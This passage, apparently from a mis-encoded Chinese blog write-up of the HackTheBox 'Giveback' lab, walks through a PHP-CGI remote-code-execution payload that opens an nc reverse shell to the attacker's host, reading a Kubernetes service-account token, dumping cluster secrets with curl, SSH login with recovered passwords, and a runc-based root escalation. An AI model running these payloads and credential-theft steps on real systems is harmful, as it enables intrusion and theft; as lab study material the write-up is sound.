class="hljs-symbol">$</span> exec <span class="hljs-number">3</span>&gt;&amp;-<br></code></pre></td></tr></table></figure><p>ä¹‹åé¡ºåˆ©ä½¿ç”¨socatå°†ç«¯å£è½¬å‘åˆ°å¤–ç½‘ã€‚</p><p><img src="/2025/11/18/HackTheBox-Giveback/msedge_tMQ3tdazO6.png"></p><h3 id="GetShell2"><a href="#GetShell2" class="headerlink" title="GetShell2"></a>GetShell2</h3><hr><p>æåˆ°äº†php-cgiï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨ä¸€ä¸‹å†åå¼¹ä¸€ä¸ªshell</p><p><a href="https://www.exploit-db.com/exploits/52331">PHP CGI Module 8.3.4 - Remote Code Execution (RCE) - PHP webapps Exploit</a></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">php <span class="hljs-operator">-</span>r &#x27;<span class="hljs-variable">$p</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.20 9999 &gt; /tmp/f&quot;</span>; <span class="hljs-variable">$o</span> <span class="hljs-operator">=</span> [<span class="hljs-string">&quot;http&quot;</span><span class="hljs-operator">=&gt;</span>[<span class="hljs-string">&quot;method&quot;</span><span class="hljs-operator">=&gt;</span><span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;header&quot;</span><span class="hljs-operator">=&gt;</span><span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span>,<span class="hljs-string">&quot;content&quot;</span><span class="hljs-operator">=&gt;</span><span class="hljs-variable">$p</span>,<span class="hljs-string">&quot;timeout&quot;</span><span class="hljs-operator">=&gt;</span><span class="hljs-number">4</span>]]; <span class="hljs-variable">$c</span><span class="hljs-operator">=</span>stream_context_create(<span class="hljs-variable">$o</span>); <span class="hljs-variable">$r</span><span class="hljs-operator">=</span><span class="hljs-meta">@file_get_contents</span>(<span class="hljs-string">&quot;http://legacy-intranet-service:5000/cgi-bin/php-cgi?--define+allow_url_include%3don+--define+auto_prepend_file%3dphp://input&quot;</span>,<span class="hljs-literal">false</span>,<span class="hljs-variable">$c</span>); echo <span class="hljs-variable">$r</span><span class="hljs-operator">===</span><span class="hljs-literal">false</span><span class="hljs-operator">?</span><span class="hljs-string">&quot;&quot;</span>:substr(<span class="hljs-variable">$r</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5000</span>);&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs vim"> ./penelope.<span class="hljs-keyword">py</span> <span class="hljs-number">9999</span><br>[+] Listening <span class="hljs-keyword">for</span> <span class="hljs-built_in">reverse</span> shells <span class="hljs-keyword">on</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">9999</span> â†’  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> â€¢ <span class="hljs-number">192.168</span>.<span class="hljs-number">21.128</span> â€¢ <span class="hljs-number">172.18</span>.<span class="hljs-number">0.1</span> â€¢ <span class="hljs-number">172.17</span>.<span class="hljs-number">0.1</span> â€¢ <span class="hljs-number">10.10</span>.<span class="hljs-number">16.20</span><br>â¤  ğŸ  Main Menu (<span class="hljs-keyword">m</span>) ğŸ’€ Payloads (<span class="hljs-keyword">p</span>) ğŸ”„ Clear (Ctrl-L) ğŸš« Quit (q/Ctrl-C)<br>[+] Got <span class="hljs-built_in">reverse</span> <span class="hljs-keyword">shell</span> from legacy-intranet-cms-<span class="hljs-number">6</span>f7bf5db84-jm6bz-<span class="hljs-number">10.10</span>.<span class="hljs-number">11.94</span>-Linux-x86_64 ğŸ˜ Assigned SessionID <span class="hljs-symbol">&lt;1&gt;</span><br>[+] Attempting <span class="hljs-keyword">to</span> upgrade <span class="hljs-keyword">shell</span> <span class="hljs-keyword">to</span> PTY...<br>[!] Python agent cannot <span class="hljs-keyword">be</span> deployed. I need <span class="hljs-keyword">to</span> maintain at least one basic session <span class="hljs-keyword">to</span> handle the PTY<br>[+] Attempting <span class="hljs-keyword">to</span> spawn <span class="hljs-keyword">a</span> <span class="hljs-built_in">reverse</span> <span class="hljs-keyword">shell</span> <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">16.20</span>:<span class="hljs-number">9999</span><br>[+] Got <span class="hljs-built_in">reverse</span> <span class="hljs-keyword">shell</span> from legacy-intranet-cms-<span class="hljs-number">6</span>f7bf5db84-jm6bz-<span class="hljs-number">10.10</span>.<span class="hljs-number">11.94</span>-Linux-x86_64 ğŸ˜ Assigned SessionID <span class="hljs-symbol">&lt;2&gt;</span><br>[+] Shell upgraded successfully using /usr/bin/script! ğŸ’ª<br>[+] Interacting with session [<span class="hljs-number">1</span>], Shell Type: PTY, Menu key: F12 <br>[+] Logging <span class="hljs-keyword">to</span> /root/.penelope/legacy-intranet-cms-<span class="hljs-number">6</span>f7bf5db84-jm6bz~<span class="hljs-number">10.10</span>.<span class="hljs-number">11.94</span>_Linux_x86_64/<span class="hljs-number">2025</span>_11_17-<span class="hljs-number">20</span>_15_58-<span class="hljs-number">173</span>.<span class="hljs-built_in">log</span> ğŸ“œ<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>/var/www/html/cgi-bin # <br>/var/www/html/cgi-bin # id<br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root),<span class="hljs-number">1</span>(bin),<span class="hljs-number">2</span>(daemon),<span class="hljs-number">3</span>(sys),<span class="hljs-number">4</span>(adm),<span class="hljs-number">6</span>(disk),<span class="hljs-number">10</span>(wheel),<span class="hljs-number">11</span>(floppy),<span class="hljs-number">20</span>(dialout),<span class="hljs-number">26</span>(tape),<span class="hljs-number">27</span>(video)<br><br></code></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªè™šæ‹Ÿæœº</p><p>è¿™é‡Œéœ€è¦çœ‹ä¸€ä¸‹k8sçš„ç›¸å…³æ–‡æ¡£ã€‚</p><p><a href="https://cloud.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/kubernetes-enumeration.html#kubernetes-enumeration">Kubernetes Enumeration - HackTricks Cloud</a></p><p>å…ˆæ‰¾åˆ°tokenï¼Œä¸€èˆ¬æ˜¯è¿™ä¸ªé»˜è®¤è·¯å¾„ã€‚</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tap">/run/secrets/kubernetes.io/serviceaccount <span class="hljs-comment"># ls -al</span><br>total 4<br>drwxrwxrwt   <span class="hljs-number"> 3 </span>root     root          <span class="hljs-number"> 140 </span>Nov<span class="hljs-number"> 18 </span>00:24 .<br>drwxr-xr-x   <span class="hljs-number"> 3 </span>root     root         <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 18 </span>00:52 ..<br>drwxr-xr-x   <span class="hljs-number"> 2 </span>root     root          <span class="hljs-number"> 100 </span>Nov<span class="hljs-number"> 18 </span>00:24 ..2025_11_18_00_24_59.298758859<br>lrwxrwxrwx   <span class="hljs-number"> 1 </span>root     root           <span class="hljs-number"> 31 </span>Nov<span class="hljs-number"> 18 </span>00:24 ..data -&gt; ..2025_11_18_00_24_59.298758859<br>lrwxrwxrwx   <span class="hljs-number"> 1 </span>root     root           <span class="hljs-number"> 13 </span>Nov<span class="hljs-number"> 17 </span>19:33 ca.crt -&gt; ..data/ca.crt<br>lrwxrwxrwx   <span class="hljs-number"> 1 </span>root     root           <span class="hljs-number"> 16 </span>Nov<span class="hljs-number"> 17 </span>19:33 namespace -&gt; ..data/namespace<br>lrwxrwxrwx   <span class="hljs-number"> 1 </span>root     root           <span class="hljs-number"> 12 </span>Nov<span class="hljs-number"> 17 </span>19:33 token -&gt; ..data/token<br>/run/secrets/kubernetes.io/serviceaccount <span class="hljs-comment"># cat token </span><br>eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk0OTYxNDk5LCJpYXQiOjE3NjM0MjU0OTksImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZDQ2ZjM5Y2QtMjgyZi00MzU4LWI0M2YtZTBmZmE0YTQ0MWE2Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LWptNmJ6IiwidWlkIjoiYjg0NGI4MDctMGIyMS00NWQ1LWJhNmYtODIxZmM1ZTFlN2RkIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2MzQyOTEwNn0sIm5iZiI6MTc2MzQyNTQ5OSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.PvzmCQj3JKPg7hksaCIQE6vPYwWk-vG_vAuqZpvYjQ-lMdgwDyd2wtJN4BVnobAcMJvPzinwkJZ4eKyvSO3NV9x64fgokfh9Iq33CtA-DnetRd0ERSdVxXkMryihWyZuo8ODOBk2YkH0VyTrENVdvqnkN_qZzeMKZTC7zs1XgHLgl-zZKH6urFQZi6PKdpkIj4r4TOnHfl98A7vaxvbY0CSgNXhR6m4yZUxQvW0-XUErPU7kPRa1Qqhl9i6sJ0L6kzRAR_qEwEAlP3Z3a6bQOBy92UpUISZrdQ_7EkUUdqtopRIe-p1tuhP0rhDmR0YoJiXRb-QsTTF9SdGJHtAoGw/run/secrets/kubernetes.io/serviceaccount <span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>ä¹‹åå†æ‰¾åˆ°æœ¬åœ°çš„k8sç«¯å£</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ubernetes.io/serviceaccount # env<br><span class="hljs-attribute">KUBERNETES_PORT</span>=tcp://10.43.0.1:443<br><span class="hljs-attribute">KUBERNETES_SERVICE_PORT</span>=443<br><span class="hljs-attribute">HOSTNAME</span>=legacy-intranet-cms-6f7bf5db84-jm6bz<br><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs makefile">Token=eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk0OTYxNDgyLCJpYXQiOjE3NjM0MjU0ODIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiOWY1M2JkZTEtYTYzZS00ZjZmLTg4ODQtZWMyZDc1NTkwYTE4Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LWxmdzdsIiwidWlkIjoiMzM3ODUxY2QtYTM2NS00NmU2LTk4MDAtZTJhYzdlMWUyZmIyIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2MzQyOTA4OX0sIm5iZiI6MTc2MzQyNTQ4Miwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.S_jH6qKcVUzi6fm8ZDb20TQnHhQZIZltOukgp4TpoEWsi9mbscb37ds-RoOfPWcOzG-V93Hl7hRsd_f67wFfs6KCvxLaZWnYuQhTIJtm2xMfyBG4O1w2Voi4xhMSjNTG_yRMC1AvM-i3v05oTH1s2K-1wehLEF4JDFtaw27iVKIBKEsrejzObJ9tWe7oBO4h5I-UztaPAMK6jehcFiWacH5MwvAB0xC6NG6xGttBtaecu1fXOFh6Ryr0l03oITzFwxyyPfkAFnadpOxeVY6X_I7Tv5kKigYAKkarAyXf2HxUOprIxwmI2JS3o2F_Vj5lW0sG1oTfcBkAZmznZec9yw<br>BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PORT=443<br>BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PROTO=tcp<br>SHELL=/bin/sh<br>BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTP=80<br>WP_NGINX_SERVICE_SERVICE_PORT_HTTP=80<br>KUBERNETES_SERVICE_PORT_HTTPS=443<br>KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443<br>PHPIZE_DEPS=autoconf            dpkg-dev dpkg           file            g++             gcc             libc-dev                make            pkgconf   re2c<br>LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241<br>KUBERNETES_SERVICE_HOST=10.43.0.1<br>PWD=/var/www/html/cgi-bin<br>PHP_SHA256=b0a996276fe21fe9ca8f993314c8bc02750f464c7b0343f056fb0894a8dfa9d1<br>BETA_VINO_WP_WORDPRESS_PORT_443_TCP=tcp://10.43.61.204:443<br>BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTPS=443<br>LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000<br>BETA_VINO_WP_WORDPRESS_SERVICE_HOST=10.43.61.204<br>WP_NGINX_SERVICE_SERVICE_HOST=10.43.4.242<br>LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp<br>LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000<br>/var/www/html/cgi-bin <span class="hljs-comment"># curl -k -H &quot;Authorization: Bearer $Token&quot; https://10.43.0.1:443/api/v1/namespaces/default/secrets</span><br><br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs 1c">  <span class="hljs-string">&quot;metadata&quot;</span><span class="hljs-punctuation">:</span> &#123;<br>        <span class="hljs-string">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;user-secret-babywyrm&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;namespace&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;default&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;uid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;43c29d37-1f8d-4958-a077-045068e46db2&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;resourceVersion&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2857705&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;creationTimestamp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2025-11-17T19:33:24Z&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;ownerReferences&quot;</span><span class="hljs-punctuation">:</span> [<br>          &#123;<br>            <span class="hljs-string">&quot;apiVersion&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;bitnami.com/v1alpha1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;kind&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;SealedSecret&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;user-secret-babywyrm&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;uid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;af0b09ab-723f-4b29-99ff-808c7fbd1fc6&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;controller&quot;</span><span class="hljs-punctuation">:</span> true<br>          &#125;<br>        ]<span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;managedFields&quot;</span><span class="hljs-punctuation">:</span> [<br>&#125;<span class="hljs-punctuation">,</span><br>      <span class="hljs-string">&quot;data&quot;</span><span class="hljs-punctuation">:</span> &#123;<br>        <span class="hljs-string">&quot;MASTERPASS&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;VlNPQW02T3JMMUJ5WjJmOEs4OU5JTldmRG55TUhldQ==</span><br><br><span class="hljs-string">&quot;</span><br>      &#125;<span class="hljs-punctuation">,</span><br>      <span class="hljs-string">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Opaque&quot;</span><br>    &#125;<br>  ]<br><br></code></pre></td></tr></table></figure><h3 id="Getbabywyrm"><a href="#Getbabywyrm" class="headerlink" title="Getbabywyrm"></a>Getbabywyrm</h3><hr><p>å¾—åˆ°ç”¨æˆ·babywyrmä»¥åŠbase64åŠ å¯†è¿‡çš„å¯†ç </p><p>ä½¿ç”¨sshæˆåŠŸç™»å½•</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"> ssh babywyrm@<span class="hljs-number">10.10</span>.<span class="hljs-number">11.94</span><br>The authenticity <span class="hljs-keyword">of</span> host <span class="hljs-string">&#x27;10.10.11.94 (10.10.11.94)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:QW0UEukNwOzzXzOIYR311JYiuhYUEv8FYbRgwiKZ35g.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.94</span><span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">babywyrm@10.10.11.94&#x27;</span>s password: <br>Welcome <span class="hljs-keyword">to</span> Ubuntu <span class="hljs-number">22.04</span>.<span class="hljs-number">5</span> LTS (GNU/Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">124</span>-generic x86_64)<br><br> * Documentation:  https:<span class="hljs-comment">//help.ubuntu.com</span><br> * Management:     https:<span class="hljs-comment">//landscape.canonical.com</span><br> * Support:        https:<span class="hljs-comment">//ubuntu.com/pro</span><br><br>This system <span class="hljs-keyword">has</span> been minimized <span class="hljs-keyword">by</span> removing packages <span class="hljs-keyword">and</span> content that are<br><span class="hljs-keyword">not</span> required <span class="hljs-keyword">on</span> a system that users <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> log <span class="hljs-keyword">into</span>.<br><br><span class="hljs-keyword">To</span> restore this content, you can run the <span class="hljs-string">&#x27;unminimize&#x27;</span> command.<br>Last login: Tue Nov <span class="hljs-number">18</span> <span class="hljs-number">01</span>:<span class="hljs-number">16</span>:<span class="hljs-number">40</span> <span class="hljs-number">2025</span> <span class="hljs-keyword">from</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">16.20</span><br>babywyrm@giveback:~$ cat user.txt <br><br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">babywyrm<span class="hljs-variable">@giveback</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> babywyrm on <span class="hljs-symbol">localhost:</span><br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>, use_pty, timestamp_timeout=<span class="hljs-number">0</span>,<br>    timestamp_timeout=<span class="hljs-number">20</span><br><br><span class="hljs-title class_">User</span> babywyrm may run the following commands on <span class="hljs-symbol">localhost:</span><br>    (<span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> !<span class="hljs-title class_">ALL</span><br>    (<span class="hljs-title class_">ALL</span>) /opt/debug<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œæ‰§è¡Œsudoè¿˜éœ€è¦ä»€ä¹ˆç®¡ç†å‘˜å¯†ç </p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs subunit">babywyrm@giveback:~$ sudo /opt/debug<br>[sudo] password for babywyrm: <br>[*] Validating sudo privileges...<br>[*] Sudo validation successful<br>Please enter the administrative password: <br><br><span class="hljs-keyword">Error: </span>Incorrect administrative password<br><br></code></pre></td></tr></table></figure><p>åˆ°å¤„è¯•æ¥è¯•å»æ‰¾ä¸åˆ°ã€‚ã€‚ã€‚</p><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><p>æœ€åå‘ç°æ˜¯wp-configé‡Œçš„å¯†ç </p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">sW5sp4spa3u7RLyetrekE4oS<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs vim">babywyrm@giveback:/tmp$ sudo /<span class="hljs-keyword">opt</span>/<span class="hljs-keyword">debug</span> --<span class="hljs-keyword">help</span><br>[*] Validating sudo privileges...<br>[*] Sudo validation successful<br>Please enter the administrative password: <br><br>[*] Administrative password verified<br>[*] Processing <span class="hljs-keyword">command</span>: --<span class="hljs-keyword">help</span><br>Restricted runc Debug Wrapper<br><br>Usage:<br>  /<span class="hljs-keyword">opt</span>/<span class="hljs-keyword">debug</span> [flags] spec<br>  /<span class="hljs-keyword">opt</span>/<span class="hljs-keyword">debug</span> [flags] run <span class="hljs-symbol">&lt;id&gt;</span><br>  /<span class="hljs-keyword">opt</span>/<span class="hljs-keyword">debug</span> <span class="hljs-keyword">version</span> | --<span class="hljs-keyword">version</span> | -v<br><br>Flags:<br>  --<span class="hljs-built_in">log</span> <span class="hljs-symbol">&lt;file&gt;</span><br>  --root <span class="hljs-symbol">&lt;path&gt;</span><br>  --<span class="hljs-keyword">debug</span><br><br></code></pre></td></tr></table></figure><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix">babywyrm@giveback:<span class="hljs-operator">/</span>$ sudo <span class="hljs-symbol">/opt/debug</span> <span class="hljs-operator">-</span>v<br>[<span class="hljs-operator">*</span>] Validating sudo privileges...<br>[<span class="hljs-operator">*</span>] Sudo validation successful<br>Please enter the administrative <span class="hljs-params">password:</span> <br><br>[<span class="hljs-operator">*</span>] Administrative password verified<br>[<span class="hljs-operator">*</span>] Processing <span class="hljs-params">command:</span> <span class="hljs-operator">-</span>v<br>runc version <span class="hljs-number">1.1</span>.<span class="hljs-number">11</span><br><span class="hljs-params">commit:</span> v1.<span class="hljs-number">1.1</span>1-<span class="hljs-number">0</span><span class="hljs-operator">-</span>g4bccb38c<br><span class="hljs-params">spec:</span> <span class="hljs-number">1.0</span>.<span class="hljs-number">2</span><span class="hljs-operator">-</span>dev<br><span class="hljs-params">go:</span> go1.<span class="hljs-number">20.12</span><br><span class="hljs-params">libseccomp:</span> <span class="hljs-number">2.5</span>.<span class="hljs-number">4</span><br><br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_43860783/article/details/122745504">runcç³»åˆ—ï¼ˆ2ï¼‰â€”â€”specification(config.json)æ–‡ä»¶è¯¦è§£_å®¹å™¨config.jsonçš„èµ„æºé…ç½®-CSDNåšå®¢</a></p><p>å‚è€ƒè¿™ç¯‡æ–‡ç« åˆ›å»ºæ¶æ„configæ–‡ä»¶ææƒã€‚</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 